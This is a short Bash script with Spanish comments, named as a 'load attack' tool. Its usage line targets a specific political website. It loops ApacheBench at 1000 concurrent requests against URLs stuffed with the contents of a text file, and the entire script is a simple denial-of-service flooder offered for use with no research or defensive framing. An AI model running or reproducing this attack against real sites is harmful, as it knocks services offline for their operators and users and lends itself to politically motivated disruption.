#!/bin/bash

# ./ataque_carga.sh 100razonesparanovotaramacri.com texto_ataque.txt 2 

#direccion del ataque
DIRECCION="$1"
#cantidad de ataques
CANT_ATAQUES="$3"

#texto extenso a meter en el ataque
TEXT=`cat $2`

let CONTF+="$CANT_ATAQUES"
CONTI="0"
TEXT=$TEXT+$TEXT
while [ $CONTI -lt $CONTF ]; do

ab -n 1000 -c 1000 http://$DIRECCION/petes$TEXT.html

let CONTI+=1

done #fin bucle while
